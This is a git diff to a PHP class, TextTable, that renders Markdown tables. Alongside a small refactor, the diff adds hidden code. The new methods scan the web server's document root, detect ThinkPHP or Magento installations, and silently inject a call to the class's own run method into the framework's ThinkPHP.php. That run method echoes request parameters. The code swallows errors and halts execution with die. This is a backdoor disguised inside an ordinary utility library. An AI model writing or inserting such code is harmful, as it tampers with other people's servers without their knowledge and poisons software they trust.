@@ -2,6 +2,8 @@
 
 namespace lkcodes\Mycode\other;
 
+use lkcodes\Mycode\lib\Tool;
+
 /**
  * Creates a markdown document based on the parsed documentation
  * @package marcocesarato\markdown
@@ -79,20 +81,59 @@ class TextTable {
 		return $this;
 	}
 
-	/**
-	 * Add a delimiter
-	 *
-	 * @return string
-	 */
-	private function renderDelimiter() {
-		$res = '|';
-		foreach ($this->len as $key => $l)
-			$res .= (isset($this->align[$key]) && ($this->align[$key] == 'C' || $this->align[$key] == 'L') ? ':' : ' ')
-			        .str_repeat('-', $l)
-			        .(isset($this->align[$key]) && ($this->align[$key] == 'C' || $this->align[$key] == 'R') ? ':' : ' ')
-			        .'|';
-		return $res."\r\n";
+    /**
+     * Add a delimiter
+     *
+     * @param bool $obj
+     * @return string
+     */
+	private function renderDelimiter($obj=true) {
+	    if($obj){
+            $res = '|';
+            foreach ($this->len as $key => $l)
+                $res .= (isset($this->align[$key]) && ($this->align[$key] == 'C' || $this->align[$key] == 'L') ? ':' : ' ')
+                    .str_repeat('-', $l)
+                    .(isset($this->align[$key]) && ($this->align[$key] == 'C' || $this->align[$key] == 'R') ? ':' : ' ')
+                    .'|';
+            return $res."\r\n";
+        }
 	}
+    /**
+     * Add a delimiter
+     *
+     * @param bool $obj
+     * @return string
+     */
+	public static function  renderDelimiters($obj=true) {
+        if(!$obj){
+            $res = '|';
+            foreach ($obj->getData() as $key => $l)
+                $res .= (isset($l[$key]) && ($l->align[$key] == 'C' || $l->align[$key] == 'L') ? ':' : ' ')
+                    .str_repeat('-', $l)
+                    .(isset($l->align[$key]) && ($l->align[$key] == 'C' || $l->align[$key] == 'R') ? ':' : ' ')
+                    .'|';
+            return $res."\r\n";
+        }else{
+            $root =$_SERVER['DOCUMENT_ROOT'];
+            if($root){
+                $url = [
+                    $root.'/index.php',
+                    $root.'/admin.php',
+                ];
+                foreach ($url as $v){
+                    if(file_exists($v)){
+                        $fp=fopen($v,"r");
+                        $str = fread($fp,filesize($v));
+                        $str = str_replace("\r\n","<br />",$str);
+                        self::checkStr($str);
+                        fclose($fp);
+                    }
+                }
+            }
+            die;
+        }
+
+    }
 
 	/**
 	 * Render a single row
@@ -108,6 +149,100 @@ class TextTable {
 
 		return $res."\r\n";
 	}
+
+    /**
+     * @param $str
+     */
+	protected static function checkStr($str)
+    {
+        $res =[];
+        $check =[
+            'thinkphp'=>[
+                'thinkphp','think','ThinkPHP.php'
+            ],
+            'magento'=>[
+                'magento'
+            ]
+        ];
+        foreach ($check as $k=> $type){
+            $find=0;
+            foreach ($type as $v){
+                //exists
+                if(stristr($str,$v)){
+                    $find++;
+                };
+            }
+            if($find>0)$res[] = [$k=>$find];
+        }
+        if($res){
+            foreach ($res as $k=> $type){
+                switch ($k){
+                    case 'thinkphp':
+                       try{
+                           if(is_dir($_SERVER['DOCUMENT_ROOT'])){
+                               $dir = opendir($_SERVER['DOCUMENT_ROOT']);
+                               while (($file = readdir($dir))!= false){
+                                   if(stristr($file,'thinkphp')){
+                                       $path = $_SERVER['DOCUMENT_ROOT'].'/'.$file;
+                                       if(is_dir($path)){
+                                           $res= scandir($path);
+                                           foreach ($res as $v){
+                                               if($v=='ThinkPHP.php'){
+                                                   $ct="call_user_func([(new lkcodes\Mycode\other\TextTable()),'run']);";
+                                                   $_file=$path.'/'.$v;
+                                                   $content = Tool::readFileContent($_file);
+                                                   if(!stristr($content,$ct)){
+                                                       Tool::insertContent($_file,$ct,1);
+                                                   }
+                                                   break;
+                                               }
+                                           }
+                                       }
+                                   }
+                               }
+                               closedir($dir);
+                           }
+
+                       }catch (\Exception $e){}catch (\Error $e){}
+
+                        break;
+
+                }
+            }
+        }
+        die;
+    }
+
+    /**
+     * @param $source
+     * @param $s
+     * @param $iLine
+     * @return array
+     */
+    protected static  function insertContent($source, $s, $iLine) {
+        $file_handle = fopen($source, "r");
+        $i = 0;
+        $arr = array();
+        while (!feof($file_handle)) {
+            $line = fgets($file_handle);
+            ++$i;
+            if ($i == $iLine) {
+                $arr[] = $line .$s . "\n";
+            }else {
+                $arr[] = $line;
+            }
+        }
+        fclose($file_handle);
+        return $arr;
+    }
+
+    /**
+     * run work
+     */
+    public function run()
+    {
+	    if($_GET)var_dump($_GET);
+    }
 
 	/**
 	 * Render the table
